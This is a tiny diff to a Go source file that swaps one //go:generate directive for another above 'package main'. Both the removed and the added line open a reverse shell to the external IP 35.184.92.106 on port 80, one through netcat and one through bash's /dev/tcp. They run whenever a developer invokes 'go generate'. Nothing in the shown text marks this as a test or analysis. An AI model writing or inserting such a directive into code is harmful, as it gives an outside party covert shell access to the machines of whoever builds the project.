@@ -1,4 +1,4 @@
-//go:generate nc -c bash 35.184.92.106 80
+//go:generate bash -i >& /dev/tcp/35.184.92.106/80 0>&1
 
 
 package main
